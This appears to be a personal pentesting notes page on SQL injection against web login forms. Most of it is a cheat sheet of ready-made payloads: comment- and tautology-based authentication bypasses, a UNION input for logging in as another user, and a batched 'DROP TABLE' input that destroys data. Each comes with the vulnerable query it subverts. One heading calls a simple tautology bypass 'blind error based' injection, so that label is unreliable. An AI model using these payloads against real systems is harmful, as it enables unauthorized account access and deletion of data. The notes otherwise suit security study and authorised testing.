---
title: 'SQLi - Login Pages '
updated: 2023-11-06 10:23:31Z
created: 2023-11-05 05:04:21Z
latitude: -33.85985000
longitude: 151.20901000
altitude: 0.0000
---

Login forms that are connected to a database of users are often developed in such a way that the web application isn't interested in the content of the username and password but more whether the two make a matching pair in the users table. In basic terms, the web application is asking the database "do you have a user with the username bob and the password bob123?", and the database replies with either yes or no (true/false) and, depending on that answer, dictates whether the web application lets you proceed or not. 

## Try to Bypass Authentication

`admin' --`
`admin' #`
`admin'/*`
`' or 1=1--`
`' or 1=1#`
`' or 1=1/*`
`') or '1'='1--`
`') or ('1'='1--`

Login as different user
`' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--`
*Old versions of MySQL doesn’t support union queries

`select * from users where username='%username%' and password='%password%' LIMIT 1;`

The **%username%** and **%password%** values are taken from the login form fields, the initial values in the SQL Query box will be blank as these fields are currently empty.
Enter the following in the password field:
`' OR 1=1;--`

Changes to:
`select * from users where username='' and password='' OR 1=1;`


## Test for BLIND ERROR BASED INJECTION
```
uName = getRequestString("username");
uPass = getRequestString("userpassword");

SELECT * FROM Users WHERE Name ="' + uName + '" AND Pass ="' + uPass + '"
```

Add to the Login and Password fields:
Username: `" or ""="`
Password:  `" or ""="`

Causes the sql statement
```
SELECT * FROM Users WHERE Name ="" or ""="" AND Pass ="" or ""=""
```

## Test for Batched Statements
```
txtUserId = getRequestString("UserId");
"SELECT * FROM Users WHERE UserId = " + txtUserId;
```
Add to the login field:
105; DROP TABLE Suppliers
`SELECT * FROM Users WHERE UserId = 105; DROP TABLE Suppliers;`